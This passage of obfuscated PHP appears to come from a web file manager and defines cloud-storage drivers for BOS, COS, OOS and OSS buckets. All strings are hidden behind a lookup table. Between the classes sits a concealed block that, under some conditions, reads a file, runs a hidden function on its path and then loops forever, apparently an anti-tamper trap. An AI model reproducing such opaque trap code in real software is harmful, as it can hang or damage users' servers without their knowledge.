$Ñ¹á³Š¾[$Ÿ½§É¨¤[6]][$Ÿ½§É¨¤[1265]]; if (substr($”±ûÓø, 0, 2) == $Ÿ½§É¨¤[1413]) { $”±ûÓø = str_replace($Ÿ½§É¨¤[1413], BASIC_PATH, $”±ûÓø); } $”±ûÓø = str_replace($Ÿ½§É¨¤[601], $Ÿ½§É¨¤[8], $”±ûÓø); if (substr($‹ııßÂ–[$Ÿ½§É¨¤[97]], 0, strlen($”±ûÓø)) == $”±ûÓø) { $áíÙä‘õ = $Ÿ½§É¨¤[206]; } } } return $áíÙä‘õ == $Ÿ½§É¨¤[1411] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ä›•şø) { parent::__construct($ä›•şø); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ãÂÇÆ¹œ) { $ĞÆœ¢ =& $_SERVER[ÕŸ²ó÷å]; if (substr($ãÂÇÆ¹œ, 0, 7) == $ĞÆœ¢[322]) { $ãÂÇÆ¹œ = $ĞÆœ¢[323] . substr($ãÂÇÆ¹œ, 7); } header($ĞÆœ¢[185] . $ãÂÇÆ¹œ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($´‚§ûª‰) { parent::__construct($´‚§ûª‰); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } public function uploadFormData($åú«ªóº, $°½¨»²‰ = 3600) { $…Åæ¦½ó =& $_SERVER[ÕŸ²ó÷å]; $–óš³“ = $…Åæ¦½ó[239]; $é’‰§ÖØ = $…Åæ¦½ó[272]; $šøÀå•¥ = $…Åæ¦½ó[283]; $é¥ÁË” = gmdate($…Åæ¦½ó[308], time() + $°½¨»²‰); $º‹â±„ï = (string) time() . $…Åæ¦½ó[84] . (string) (time() + $°½¨»²‰); $§íºèÔ = array($…Åæ¦½ó[284] => $é¥ÁË”, $…Åæ¦½ó[287] => array(array($…Åæ¦½ó[289] => $–óš³“), array($…Åæ¦½ó[288] => $this->bucket), array($…Åæ¦½ó[290], $…Åæ¦½ó[291], $…Åæ¦½ó[12]), array($…Åæ¦½ó[294] => $šøÀå•¥), array($…Åæ¦½ó[1414] => $é’‰§ÖØ), array($…Åæ¦½ó[1415] => $this->accessKey), array($…Åæ¦½ó[1416] => $º‹â±„ï))); $§íºèÔ = json_encode($§íºèÔ); $©òƒ¤¦ = hash_hmac($…Åæ¦½ó[272], $º‹â±„ï, $this->secret); $¤ÕËŞ¤è = sha1($§íºèÔ); $”•…íœÍ = hash_hmac($…Åæ¦½ó[272], $¤ÕËŞ¤è, $©òƒ¤¦); $ó×ß·¯£ = array($…Åæ¦½ó[289] => $–óš³“, $…Åæ¦½ó[294] => $šøÀå•¥, $…Åæ¦½ó[302] => base64_encode($§íºèÔ), $…Åæ¦½ó[1414] => $é’‰§ÖØ, $…Åæ¦½ó[1415] => $this->accessKey, $…Åæ¦½ó[1417] => $º‹â±„ï, $…Åæ¦½ó[1418] => $”•…íœÍ, $…Åæ¦½ó[218] => $this->getHost()); return $ó×ß·¯£; } public function fileOutImage($ºƒÊ´, $–ËØµ¯ = 250) { $Şñª»Şã =& $_SERVER[ÕŸ²ó÷å]; if ($this->size($ºƒÊ´) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ºƒÊ´, $–ËØµ¯); } $ŸÙ¨Í›˜ = $this->link($ºƒÊ´); $ŸÙ¨Í›˜ .= $Şñª»Şã[1419] . $–ËØµ¯ . $Şñª»Şã[1420]; $this->fileOutLink($ŸÙ¨Í›˜); } public function fileOutLink($óÂìÜ«Ó) { $ìÑ›Â†« =& $_SERVER[ÕŸ²ó÷å]; if (substr($óÂìÜ«Ó, 0, 7) == $ìÑ›Â†«[322]) { $óÂìÜ«Ó = $ìÑ›Â†«[323] . substr($óÂìÜ«Ó, 7); } header($ìÑ›Â†«[185] . $óÂìÜ«Ó); die; } } goto d°÷¾²êµ; Bµ“Áœ”ñ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ƒ°õ˜ÊÙ) { parent::__construct($ƒ°õ˜ÊÙ); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } public function fileOutLink($èîúì€¸) { $»¸½Ü¿Û =& $_SERVER[ÕŸ²ó÷å]; if (substr($èîúì€¸, 0, 7) == $»¸½Ü¿Û[322]) { $èîúì€¸ = $»¸½Ü¿Û[323] . substr($èîúì€¸, 7); } header($»¸½Ü¿Û[185] . $èîúì€¸); die; } } if (!isset($_SERVER[$_SERVER[ÕŸ²ó÷å][54]]) || !isset($_SERVER[$_SERVER[ÕŸ²ó÷å][63]])) { $_getc = $_SERVER[ÕŸ²ó÷å][56]; $_getfile = $_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÕŸ²ó÷å][59], $_getfilec); if (count($_getarrs) < $_SERVER[ÕŸ²ó÷å][60]) { $exit = $_SERVER[ÕŸ²ó÷å][61]; $exit(); } $_act = $_SERVER[ÕŸ²ó÷å][62]; $_act($_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÕŸ²ó÷å][463]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ß´€®) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÕŸ²ó÷å][1463]; $this->_init($ß´€®); } public function _init($ŸÂÂà·“) { $ŞÃî•ı§ =& $_SERVER[ÕŸ²ó÷å]; $this->config = $ŸÂÂà·“; foreach ($ŸÂÂà·“ as $›ã´ú­– => $ªÂšÚ´†) { if (isset($this->{$›ã´ú­–})) { $this->{$›ã´ú­–} = $ªÂšÚ´†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ŞÃî•ı§[1464] . LNG($ŞÃî•ı§[1465])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $üÂ¸¢û¼ =& $_SERVER[ÕŸ²ó÷å]; $•˜ùëÆ¢ = new OSS\Model\CorsConfig(); $üŠòÃ¨½ = new OSS\Model\CorsRule(); $üŠòÃ¨½->addAllowedOrigin($üÂ¸¢û¼[1466]); $üŠòÃ¨½->addAllowedMethod($üÂ¸¢û¼[1467]); $üŠòÃ¨½->addAllowedMethod($üÂ¸¢û¼[1468]); $üŠòÃ¨½->addAllowedMethod($üÂ¸¢û¼[1469]); $üŠòÃ¨½->addAllowedMethod($üÂ¸¢û¼[1470]); $üŠòÃ¨½->addAllowedMethod($üÂ¸¢û¼[175]); $üŠòÃ¨½->setMaxAgeSeconds(600); $üŠòÃ¨½->addExposeHeader($üÂ¸¢û¼[1471]); $üŠòÃ¨½->addAllowedHeader($üÂ¸¢û¼[1466]); $•˜ùëÆ¢->addRule($üŠòÃ¨½); try { $this->client->putBucketCors($this->bucket, $•˜ùëÆ¢); } catch (OSS\Core\OssException $ÉÔ¥ÕıÚ) { $this->writeLog(__FUNCTION__ . $üÂ¸¢û¼[224] . $ÉÔ¥ÕıÚ->getMessage()); return !1; } return !0; } public function getBucketCors() { $Š¬·¥§¯ =& $_SERVER[ÕŸ²ó÷å]; $Ûå¥©Šã = null; try { $Ûå¥©Šã = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $›ÅØÂ¨) { $this->writeLog(__FUNCTION__ . $Š¬·¥§¯[224] . $›ÅØÂ¨->getMessage()); return null; } if (!$Ûå¥©Šã || !($¬ÓıÒõÃ = $Ûå¥©Šã->getRules())) { return null; } $îµÌ·ç‰ = $¬ÓıÒõÃ[0]->getAllowedOrigins(); $‹æº¥Ø› = $¬ÓıÒõÃ[0]->getAllowedMethods(); $¶Ş¾£Ü = $¬ÓıÒõÃ[0]->getMaxAgeSeconds(); $ü™¥µŒ€ = $¬ÓıÒõÃ[0]->getExposeHeaders(); $«¬ËÌõ = $¬ÓıÒõÃ[0]->getAllowedHeaders(); return array($Š¬·¥§¯[228] => isset($îµÌ·ç‰[0]) ? $îµÌ·ç‰[0] : $Š¬·¥§¯[12], $Š¬·¥§¯[232] => $‹æº¥Ø›, $Š¬·¥§¯[1472] => $¶Ş¾£Ü, $Š¬·¥§¯[1473] => isset($ü™¥µŒ€[0]) ? $ü™¥µŒ€[0] : $Š¬·¥§¯[12], $Š¬·¥§¯[229] => isset($«¬ËÌõ[0]) ? $«¬ËÌõ[0] : $Š¬·¥§¯[12]); } public function isBucketCors() { $½€òšŠÓ =& $_SERVER[ÕŸ²ó÷å]; $´š×­‡ƒ = $this->getBucketCors(); if (!$´š×­‡ƒ || !is_array($´š×­‡ƒ)) { return !1; } if ($´š×­‡ƒ[$½€òšŠÓ[228]] != $½€òšŠÓ[230] || $´š×­‡ƒ[$½€òšŠÓ[229]] != $½€òšŠÓ[230]) { return !1; } $ËãÖîÙñ = array_map($½€òšŠÓ[231], $´š×­‡ƒ[$½€òšŠÓ[232]]); if (!is_array($ËãÖîÙñ)) { $ËãÖîÙñ = array(); } $¸¹–Õã— = array($½€òšŠÓ[233], $½€òšŠÓ[234], $½€òšŠÓ[235], $½€òšŠÓ[236], $½€òšŠÓ[237]); $ıÓ‚»à­ = array_diff($¸¹–Õã—, $ËãÖîÙñ); return empty($ıÓ‚»à­); } public function mkfile($ÆÄ˜àÀÜ, $ÃÌ¦œÙ» = '', $«ò¢ÀÀ° = REPEAT_RENAME) { $¶ŸÇÇŒÚ = $this->setContent($ÆÄ˜àÀÜ, $ÃÌ¦œÙ»); if ($¶ŸÇÇŒÚ !== !1) { return $this->getPathOuter($ÆÄ˜àÀÜ); } return !1; } public function mkdir($ìó®Åİ, $‰±Âğ»³ = REPEAT_SKIP) { if ($‰±Âğ»³ && $this->_isFolder($ìó®Åİ)) { return $this->getPathOuter($ìó®Åİ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ìó®Åİ)); } catch (OSS\Core\OssException $€Î¼ƒõú) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $€Î¼ƒõú->getMessage()); return !1; } return $this->getPathOuter($ìó®Åİ); } private function fileList($¦¨Ñúı, $ï õÊ«‚ = '', $ ûËÄÌÍ = 0) { $å‰úë‘ =& $_SERVER[ÕŸ²ó÷å]; $¦¨Ñúı = trim($¦¨Ñúı, $å‰úë‘[8]); $ï‰çæÎå = empty($¦¨Ñúı) && $¦¨Ñúı !== $å‰úë‘[238] ? $å‰úë‘[12] : $¦¨Ñúı . $å‰úë‘[8]; $€³ĞªËÉ = $å‰úë‘[12]; $ğœŒÚ­ñ = 1000; $ÕÜ¯’ğ = $ÅÊ²ÜÄÇ = array(); while (!0) { check_abort(); $³ûâıÔ¶ = array($å‰úë‘[1474] => $ï õÊ«‚, $å‰úë‘[1475] => $ï‰çæÎå, $å‰úë‘[1476] => $ğœŒÚ­ñ, $å‰úë‘[1477] => $€³ĞªËÉ); try { $úøÀ°ú¢ = $this->client->listObjects($this->bucket, $³ûâıÔ¶); } catch (OSS\Core\OssException $¡éú’») { $this->writeLog(__FUNCTION__ . $å‰úë‘[224] . $¡éú’»->getMessage()); break; } $€³ĞªËÉ = $úøÀ°ú¢->getNextMarker(); $‹ÑÛ½î = $úøÀ°ú¢->getObjectList(); $Ê¢¦ï½« = $úøÀ°ú¢->getPrefixList(); foreach ($‹ÑÛ½î as $›Æ‡™) { if ($›Æ‡™->getKey() == $ï‰çæÎå) { continue; } $õ¬¬¬€š = $›Æ‡™->getKey(); $ˆøˆÂî = $›Æ‡™->getSize(); $¿ıÉ™Ì = $›Æ‡™->getLastModified(); $á’ÀÏÃ = trim($›Æ‡™->getETag(), $å‰úë‘[131]); $Ôë½ © = $ ûËÄÌÍ ? array($å‰úë‘[32] => $õ¬¬¬€š, $å‰úë‘[89] => $ˆøˆÂî, $å‰úë‘[216] => strtotime($¿ıÉ™Ì), $å‰úë‘[1478] => $á’ÀÏÃ) : $õ¬¬¬€š; $Ä±·¥µÎ = $ˆøˆÂî == 0 && substr($õ¬¬¬€š, strlen($õ¬¬¬€š) - 1, 1) == $å‰úë‘[8] ? !0 : !1; $Ùä÷Ñ—“ = array($å‰úë‘[89] => $ˆøˆÂî, $å‰úë‘[1479] => $ˆøˆÂî, $å‰úë‘[98] => strtotime($¿ıÉ™Ì), $å‰úë‘[1480] => $¿ıÉ™Ì, $å‰úë‘[1478] => $á’ÀÏÃ); $this->cacheMethodInfoSet($õ¬¬¬€š, $Ä±·¥µÎ, $Ùä÷Ñ—“); if ($Ä±·¥µÎ) { $ÕÜ¯’ğ[] = $õ¬¬¬€š; continue; } $ÅÊ²ÜÄÇ[] = $Ôë½ ©; } foreach ($Ê¢¦ï½« as $„È¢Ïú) { $ÕÜ¯’ğ[] = $„È¢Ïú->getPrefix(); $this->cacheMethodInfoSet($„È¢Ïú->getPrefix(), !0); } if ($€³ĞªËÉ === $å‰úë‘[12]) { break; } } $this->cacheMethodInfoSet($¦¨Ñúı, !0); return array($å‰úë‘[95] => $ÕÜ¯’ğ, $å‰úë‘[96] => $ÅÊ²ÜÄÇ); } public function listObject($·ÏéÂº», $”»ÏØ“  = '') { $£…«ëÆÚ =& $_SERVER[ÕŸ²ó÷å]; $·ÏéÂº» = trim($·ÏéÂº», $£…«ëÆÚ[8]); $©ã¢»É± = empty($·ÏéÂº») && $·ÏéÂº» !== $£…«ëÆÚ[238] ? $£…«ëÆÚ[12] : $·ÏéÂº» . $£…«ëÆÚ[8]; $ñ×Ù¯Ã = $£…«ëÆÚ[12]; $ğ›Ÿ·Ã = 1000; $ÕÄ‡êƒ¼ = $ú°áÄÙ¹ = array(); while (!0) { check_abort(); $ñ×©™ş = array($£…«ëÆÚ[1474] => $”»ÏØ“ , $£…«ëÆÚ[1475] => $©ã¢»É±, $£…«ëÆÚ[1476] => $ğ›Ÿ·Ã, $£…«ëÆÚ[1477] => $ñ×Ù¯Ã); try { $ÔÖíÈ¸ = $this->client->listObjects($this->bucket, $ñ×©™ş); } catch (OSS\Core\OssException $õÑ¿ßç) { $this->writeLog(__FUNCTION__ . $£…«ëÆÚ[224] . $õÑ¿ßç->getMessage()); break; } $ñ×Ù¯Ã = $ÔÖíÈ¸->getNextMarker(); $À¯èÜÒ¥ = $ÔÖíÈ¸->getObjectList(); foreach ($À¯èÜÒ¥ as $”¥“†µ¡) { if ($”¥“†µ¡->getKey() == $©ã¢»É±) { continue; } $î¬¯Ï™Ù = $”¥“†µ¡->getKey(); $Ø‰­ı€ = $”¥“†µ¡->getSize(); $ğŒîÑÄ = $Ø‰­ı€ == 0 && substr($î¬¯Ï™Ù, strlen($î¬¯Ï™Ù) - 1, 1) == $£…«ëÆÚ[8] ? !0 : !1; if ($ğŒîÑÄ) { continue; } $ú°áÄÙ¹[] = $Ø‰­ı€ . $£…«ëÆÚ[224] . $î¬¯Ï™Ù; } if ($ñ×Ù¯Ã === $£…«ëÆÚ[12]) { break; } } return array($£…«ëÆÚ[95] => $ÕÄ‡êƒ¼, $£…«ëÆÚ[96] => $ú°áÄÙ¹); } public function copyFile($ùôĞıÀ, $±íÉ²ø¿) { $ë†™×Õ² = $this->size($ùôĞıÀ); if ($ë†™×Õ² < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ùôĞıÀ, $this->bucket, $this->pathEncode($±íÉ²ø¿)); } catch (OSS\Core\OssException $Ã‘‰Øµæ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $Ã‘‰Øµæ->getMessage()); return !1; } return $this->getPathOuter($±íÉ²ø¿); } $ßôÒå¶ç = $this->multiCopyObject($ùôĞıÀ, $±íÉ²ø¿, $ë†™×Õ²); return $ßôÒå¶ç ? $this->getPathOuter($±íÉ²ø¿) : !1; } private function multiCopyObject($¿ÈÁ¬Œ­, $î¢—÷şª, $Ù²©ÏË÷) { $÷ÜÌ¸œ‚ =& $_SERVER[ÕŸ²ó÷å]; try { $äªßÂò¯ = array(); if ($¨Ü—Í¨ = $this->hashMd5($¿ÈÁ¬Œ­)) { $äªßÂò¯ = array(OSS\OssClient::OSS_HEADERS => array($÷ÜÌ¸œ‚[1481] => $¨Ü—Í¨)); } $Ëş³Ş²å = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($î¢—÷şª), $äªßÂò¯); $Î‘ÜÂÎ¡ = 1; $Áı¶Ê„À = 0; $ÒÖı Ã€ = array(); $‰Å‡á¹ = 1024 * 1024 * 10; $«›ãç = $this->client->generateMultiuploadParts($Ù²©ÏË÷, $‰Å‡á¹); foreach ($«›ãç as $î•ØĞ” => $¥¾Î¨Ë) { $·”¥¹Ş£ = $Áı¶Ê„À + (int) $¥¾Î¨Ë[$÷ÜÌ¸œ‚[1482]]; $íû’ Ÿö = (int) $¥¾Î¨Ë[$÷ÜÌ¸œ‚[422]] + $·”¥¹Ş£ - 1; $åÄŸ©Ø™ = array($÷ÜÌ¸œ‚[177] => $·”¥¹Ş£, $÷ÜÌ¸œ‚[178] => $íû’ Ÿö); $ÒÖı Ã€[] = $this->client->uploadPartCopy($this->bucket, $¿ÈÁ¬Œ­, $this->bucket, $this->pathEncode($î¢—÷şª), $Î‘ÜÂÎ¡, $Ëş³Ş²å, $åÄŸ©Ø™); $Î‘ÜÂÎ¡ = $Î‘ÜÂÎ¡ + 1; } $®ƒ‰íà‹ = array(); foreach ($ÒÖı Ã€ as $î•ØĞ” => $Õû·İè) { $®ƒ‰íà‹[] = array($÷ÜÌ¸œ‚[317] => $î•ØĞ” + 1, $÷ÜÌ¸œ‚[318] => $Õû·İè); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($î¢—÷şª), $Ëş³Ş²å, $®ƒ‰íà‹); } catch (OSS\Core\OssException $ĞÌ³íªş) { $this->writeLog(__FUNCTION__ . $÷ÜÌ¸œ‚[224] . $ĞÌ³íªş->getMessage()); return !1; } return !0; } public function moveFile($°†€ÒÁü, $âŒƒ­¤) { if ($this->copyFile($°†€ÒÁü, $âŒƒ­¤)) { $this->remove($°†€ÒÁü); return $this->getPathOuter($âŒƒ­¤); } return !1; } public function delFile($ „›™ ¦) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ „›™ ¦)); } catch (OSS\Core\OssException $€é‡à¥›) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $€é‡à¥›->getMessage()); return !1; } return !0; } public function delFolder($äÈÜÎÕ¼) { $“İÆšÒ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->exist($äÈÜÎÕ¼)) { return !0; } $this->listItemCache = !1; $°§«˜®˜ = $this->fileList($äÈÜÎÕ¼); $this->listItemCache = !0; $µÉ‚‘Ú = trim($äÈÜÎÕ¼, $“İÆšÒ[8]) . $“İÆšÒ[8]; if (!empty($äÈÜÎÕ¼) && $äÈÜÎÕ¼ !== $“İÆšÒ[238] && !in_array($µÉ‚‘Ú, $°§«˜®˜[$“İÆšÒ[95]])) { $°§«˜®˜[$“İÆšÒ[95]][] = $µÉ‚‘Ú; } $‹Ù’Ä“– = $this->delByBatch($°§«˜®˜[$“İÆšÒ[96]]); if (!$‹Ù’Ä“–) { return !1; } $‹Ù’Ä“– = $this->delByBatch($°§«˜®˜[$“İÆšÒ[95]]); if (!$‹Ù’Ä“–) { return !1; } return $this->delFile($µÉ‚‘Ú); } private function delByBatch($äÂ¡Åé´) { foreach (array_chunk($äÂ¡Åé´, 1000) as $æìÆ­›) { try { $this->client->deleteObjects($this->bucket, $æìÆ­›); } catch (OSS\Core\OssException $ÎŠ½‰¢ ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][224] . $ÎŠ½‰¢ ->getMessage()); return !1; } } return !0; } public function rename($€’˜ğ• , $®·¹—Êò) { return $this->renameObject($€’˜ğ• , $®·¹—Êò); } private function fileInfo($ÕÆ šÛ, $èÛà˜âÏ = false, $×èºŸùŸ = array()) { $‚«ÂÅ•ò =& $_SERVER[ÕŸ²ó÷å]; $ÎÁÎıû” = array($‚«ÂÅ•ò[32] => $this->pathThis($ÕÆ šÛ), $‚«ÂÅ•ò[97] => $this->getPathOuter($ÕÆ šÛ), $‚«ÂÅ•ò[33] => $‚«ÂÅ•ò[240], $‚«ÂÅ•ò[89] => isset($×èºŸùŸ[$‚«ÂÅ•ò[89]]) ? $×èºŸùŸ[$‚«ÂÅ•ò[89]] : 0, $‚«ÂÅ•ò[179] => $this->ext($ÕÆ šÛ)); if ($èÛà˜âÏ) { return $ÎÁÎıû”; } $ÎÁÎıû”[$‚«ÂÅ•ò[241]] = $ÎÁÎıû”[$‚«ÂÅ•ò[98]] = 0; $ÎÁÎıû”[$‚«ÂÅ•ò[242]] = $ÎÁÎıû”[$‚«ÂÅ•ò[243]] = !0; if (empty($×èºŸùŸ)) { $èœ•À„ = $this->objectMeta($ÕÆ šÛ); if (!$èœ•À„) { return $ÎÁÎıû”; } $×èºŸùŸ = array($‚«ÂÅ•ò[98] => strtotime($èœ•À„[$‚«ÂÅ•ò[1480]]), $‚«ÂÅ•ò[89] => $èœ•À„[$‚«ÂÅ•ò[1479]] + 0, $‚«ÂÅ•ò[1478] => $èœ•À„[$‚«ÂÅ•ò[1478]]); } if (isset($×èºŸùŸ[$‚«ÂÅ•ò[1478]]) && $×èºŸùŸ[$‚«ÂÅ•ò[1478]]) { $ÎÁÎıû”[$‚«ÂÅ•ò[245]] = trim($×èºŸùŸ[$‚«ÂÅ•ò[1478]], $‚«ÂÅ•ò[131]); } if (isset($×èºŸùŸ[$‚«ÂÅ•ò[89]])) { $ÎÁÎıû”[$‚«ÂÅ•ò[89]] = $×èºŸùŸ[$‚«ÂÅ•ò[89]]; } if (isset($×èºŸùŸ[$‚«ÂÅ•ò[98]])) { $ÎÁÎıû”[$‚«ÂÅ•ò[98]] = $×èºŸùŸ[$‚«ÂÅ•ò[98]]; } if (isset($×èºŸùŸ[$‚«ÂÅ•ò[216]]) && !trim($ÎÁÎıû”[$‚«ÂÅ•ò[98]])) { $ÎÁÎıû”[$‚«ÂÅ•ò[98]] = $×èºŸùŸ[$‚«ÂÅ•ò[216]]; } return $ÎÁÎıû”; } private function folderInfo($ÌşÖÏßŠ, $°ÍÚÜ¾º = false, $†ö«´«€ = array()) { $ş†Å¨›÷ =& $_SERVER[ÕŸ²ó÷å]; $ñè´‡ = array($ş†Å¨›÷[32] => $this->pathThis($ÌşÖÏßŠ), $ş†Å¨›÷[97] => $this->getPathOuter($ş†Å¨›÷[8] . $ÌşÖÏßŠ), $ş†Å¨›÷[33] => $ş†Å¨›÷[88]); if ($°ÍÚÜ¾º) { return $ñè´‡; } $ñè´‡[$ş†Å¨›÷[241]] = $ñè´‡[$ş†Å¨›÷[98]] = 0; $ñè´‡[$ş†Å¨›÷[242]] = $ñè´‡[$ş†Å¨›÷[243]] = !0; if (empty($†ö«´«€)) { $ÌşÖÏßŠ = rtrim($ÌşÖÏßŠ, $ş†Å¨›÷[8]) . $ş†Å¨›÷[8]; $èŒˆãŒ‹ = $this->objectMeta($ÌşÖÏßŠ); if (!$èŒˆãŒ‹) { return $ñè´‡; } $†ö«´«€ = array($ş†Å¨›÷[241] => $èŒˆãŒ‹[$ş†Å¨›÷[584]][$ş†Å¨›÷[1483]], $ş†Å¨›÷[98] => strtotime($èŒˆãŒ‹[$ş†Å¨›÷[1480]])); } if (isset($†ö«´«€[$ş†Å¨›÷[98]])) { $ñè´‡[$ş†Å¨›÷[98]] = $†ö«´«€[$ş†Å¨›÷[98]]; } if (isset($†ö«´«€[$ş†Å¨›÷[241]])) { $ñè´‡[$ş†Å¨›÷[241]] = $†ö«´«€[$ş†Å¨›÷[241]]; } return $ñè´‡; } public function listPath($†²áÍ§§, $ˆòÚ‚Àª = false) { $¿ñ¡¶Ö =& $_SERVER[ÕŸ²ó÷å]; $µ­ª³Ñ = $this->fileList($†²áÍ§§, $¿ñ¡¶Ö[8], !0); foreach ($µ­ª³Ñ[$¿ñ¡¶Ö[95]] as $ñÃü¹Ü => $ˆÇøîÎÜ) { $µ­ª³Ñ[$¿ñ¡¶Ö[95]][$ñÃü¹Ü] = $this->folderInfo($ˆÇøîÎÜ, $ˆòÚ‚Àª, $ˆÇøîÎÜ); } foreach ($µ­ª³Ñ[$¿ñ¡¶Ö[96]] as $ñÃü¹Ü => $ˆÇøîÎÜ) { $µ­ª³Ñ[$¿ñ¡¶Ö[96]][$ñÃü¹Ü] = $this->fileInfo($ˆÇøîÎÜ[$¿ñ¡¶Ö[32]], $ˆòÚ‚Àª, $ˆÇøîÎÜ); } return $µ­ª³Ñ; } protected function infoChildren($É²ÅÒş, &$á’ş…) { $¢ôñÖŠÃ =& $_SERVER[ÕŸ²ó÷å]; $É›â¥»½ = $this->fileList($É²ÅÒş, $¢ôñÖŠÃ[12], !0); $á’ş…[$¢ôñÖŠÃ[91]] += count($É›â¥»½[$¢ôñÖŠÃ[95]]); $á’ş…[$¢ôñÖŠÃ[90]] += count($É›â¥»½[$¢ôñÖŠÃ[96]]); foreach ($É›â¥»½[$¢ôñÖŠÃ[96]] as $®´õı÷) { if (!$®´õı÷ || !$®´õı÷[$¢ôñÖŠÃ[89]]) { continue; } $á’ş…[$¢ôñÖŠÃ[89]] += $®´õı÷[$¢ôñÖŠÃ[89]]; } } public function has($­°˜¹Œ‚, $ÃÚˆÁ¬‹ = false, $¿ÇòËµ = true) { $›©´Ñ— =& $_SERVER[ÕŸ²ó÷å]; $­°˜¹Œ‚ = trim($­°˜¹Œ‚, $›©´Ñ—[8]); $¡Ä™ˆ¡ü = empty($­°˜¹Œ‚) && $­°˜¹Œ‚ !== $›©´Ñ—[238] ? $›©´Ñ—[12] : $­°˜¹Œ‚ . $›©´Ñ—[8]; $Û˜ŸŒ‹² = $›©´Ñ—[12]; $û‡·©­¼ = 500; $õ‡ıÊÜÙ = $¿§úßãÛ = 0; while (!0) { check_abort(); $ı™Ò› = array($›©´Ñ—[1474] => $›©´Ñ—[8], $›©´Ñ—[1475] => $¡Ä™ˆ¡ü, $›©´Ñ—[1476] => $û‡·©­¼, $›©´Ñ—[1477] => $Û˜ŸŒ‹²); try { $´±äòÎ = $this->client->listObjects($this->bucket, $ı™Ò›); } catch (OSS\Core\OssException $úšÌÊ™â) { $this->writeLog(__FUNCTION__ . $›©´Ñ—[224] . $úšÌÊ™â->getMessage()); break; } $Û˜ŸŒ‹² = $´±äòÎ->getNextMarker(); $„Ğ¬î´ = $´±äòÎ->getObjectList(); $ôàÁïØ¶ = $´±äòÎ->getPrefixList(); if ($ÃÚˆÁ¬‹) { if (count($„Ğ¬î´) > 1 || count($„Ğ¬î´) == 1 && $„Ğ¬î´[0]->getKey() != $¡Ä™ˆ¡ü) { $õ‡ıÊÜÙ += count($„Ğ¬î´) - 1; } if (!empty($ôàÁïØ¶)) { $¿§úßãÛ += count($ôàÁïØ¶); } if ($Û˜ŸŒ‹² === $›©´Ñ—[12]) { break; } continue; } if ($¿ÇòËµ) { if (!empty($„Ğ¬î´)) { if (count($„Ğ¬î´) > 1 || $„Ğ¬î´[0]->getKey() != $¡Ä™ˆ¡ü) { return !0; } } } else { if (!empty($ôàÁïØ¶)) { return !0; } } if ($Û˜ŸŒ‹² === $›©´Ñ—[12]) { break; } } if ($ÃÚˆÁ¬‹) { return array($›©´Ñ—[249] => $õ‡ıÊÜÙ, $›©´Ñ—[250] => $¿§úßãÛ); } return !1; } public function listAll($„ö’¨ü’) { $Äå¦…İ´ =& $_SERVER[ÕŸ²ó÷å]; $ë•Ï¢»½ = $this->fileList($„ö’¨ü’, $Äå¦…İ´[12], !0); $¬¥áê«ò = array_to_keyvalue($ë•Ï¢»½[$Äå¦…İ´[96]], $Äå¦…İ´[32]); foreach ($ë•Ï¢»½[$Äå¦…İ´[95]] as $ıÇ–õÍ) { if (is_string($ıÇ–õÍ)) { $¬¥áê«ò[$ıÇ–õÍ] = array($Äå¦…İ´[89] => 0); } } return $this->listAllFiles($„ö’¨ü’, $¬¥áê«ò); } public function canRead($ËĞ¿Äï·) { $€¤õÁÌª =& $_SERVER[ÕŸ²ó÷å]; $¦¦¤º = $this->pathAcl($ËĞ¿Äï·); return $¦¦¤º == $€¤õÁÌª[1484] || $¦¦¤º == $€¤õÁÌª[628] ? !0 : !1; } public function canWrite($–êÅ¼î) { $Ô´“òåÏ = $this->pathAcl($–êÅ¼î); return $Ô´“òåÏ == $_SERVER[ÕŸ²ó÷å][628] ? !0 : !1; } public function pathAcl($¯¨ïà…›) { $ÂÍƒıè =& $_SERVER[ÕŸ²ó÷å]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $éîÓù”Â = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¯¨ïà…›)); } catch (OSS\Core\OssException $ë¶¤ßı°) { $this->writeLog(__FUNCTION__ . $ÂÍƒıè[224] . $ë¶¤ßı°->getMessage()); return !1; } $ ÖºûÒ = $éîÓù”Â == $ÂÍƒıè[37] ? $this->bucketAcl : $éîÓù”Â; if ($ ÖºûÒ == $ÂÍƒıè[1485]) { return $ÂÍƒıè[1484]; } if ($ ÖºûÒ == $ÂÍƒıè[1486]) { return $ÂÍƒıè[628]; } return $ ÖºûÒ; } private function chmodPath($¶îêúşà, $ÔÄ›ÍÃò = '') { $ëÛ€­„÷ =& $_SERVER[ÕŸ²ó÷å]; $¯÷¦Š©¶ = 